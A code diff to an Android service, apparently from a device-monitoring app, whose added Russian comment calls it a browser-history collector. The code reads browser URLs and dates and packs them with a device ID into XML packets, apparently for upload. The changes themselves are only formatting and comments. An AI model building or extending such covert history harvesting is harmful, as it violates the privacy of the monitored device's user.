@@ -22,6 +22,11 @@ import com.inet.android.bs.FileLog;
 import com.inet.android.bs.Request;
 import com.inet.android.bs.WorkTimeDefiner;
 
+/** Класс сбора истории стандартного браузера
+ * 
+ * @author johny homicide
+ *
+ */
 public class LinkService extends Service {
 
 	private static final int SERVICE_REQUEST_CODE = 25; // уникальный int сервиса
@@ -39,7 +44,7 @@ public class LinkService extends Service {
 		FileLog.writeLog("onCreate histroyService");
 		
 		context = getApplicationContext();
-		sp = PreferenceManager.getDefaultSharedPreferences(context);// getPreferences(MODE_PRIVATE);
+		sp = PreferenceManager.getDefaultSharedPreferences(context);
 
 	}
 
@@ -120,17 +125,13 @@ public class LinkService extends Service {
 			while (mCur.isAfterLast() == false && cont) {
 				urlDate = mCur.getString(mCur
 						.getColumnIndex(Browser.BookmarkColumns.DATE));
-				Context context = getApplicationContext();
-				
-				// Create a DateFormatter object for displaying date in
-				// specified format.
+				Context context = getApplicationContext();	
+
 				DateFormat formatter = new SimpleDateFormat(
 						"yyyy-MM-dd HH:mm:ss");
 
 				String savedTime = sPref.getString(SAVED_TIME, "");
 
-				// Create a calendar object that will convert the date and time
-				// value in milliseconds to date.
 				Calendar calendar = Calendar.getInstance();
 				calendar.setTimeInMillis(Long.parseLong(savedTime));
 
@@ -150,7 +151,8 @@ public class LinkService extends Service {
 					String urlDateInFormat = formatter.format(calendar.getTime())
 							.toString();
 
-					String sendStr = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>" + urlDateInFormat
+					String sendStr = "<packet><id>" + sp.getString("ID", "ID") 
+							+ "</id><time>" + urlDateInFormat
 							+ "</time><type>4</type><app>"
 							+ "Интернет-браузер</app><url>" + url
 							+ "</url><ntime>" + "30"
